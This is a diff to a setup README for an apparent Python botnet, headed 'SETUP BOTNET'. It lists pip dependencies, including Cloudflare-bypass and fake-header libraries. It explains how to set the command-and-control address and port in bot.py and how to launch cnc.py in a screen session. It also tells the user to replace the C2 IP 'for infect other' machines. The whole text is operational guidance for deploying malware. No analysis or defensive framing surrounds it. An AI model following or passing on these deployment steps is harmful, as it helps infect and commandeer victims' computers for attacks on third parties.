@@ -1,5 +1,34 @@
-cmd | run file setup_pip.bat
+<--+--[ SETUP BOTNET ]--+-->
 
+# install packet #
+
+pip install cryptography
+pip install fake_useragent
+pip install fake_headers
+pip install cfscrape
+pip install cloudscraper
+pip install requests
+pip install ipaddress
+pip install discord-webhook
+pip install PySocks
+
+# change #
+you can change ip and port in bot.py
+if you change botnet port pls change port cnc.py too
+
+EXAMPLE CHANGE
+
+bot.py (file)
++-------------------------------+
+C2_ADDRESS  = "1.1.1.1"
+C2_PORT     = 8185
++--------------------------------+
+
+c2.py (command)
+screen python3 cnc.py 8185
+python3 cnc.py 8185
+
+# setp next #
 if move ip c2 from 127.0.0.1 to other pls replace this C2_ADDRESS  = "127.0.0.1" with you IP C2 in files bot.py for infect other
 if you wanna run in server (vpn) or computer/notebook | pls not replace
 
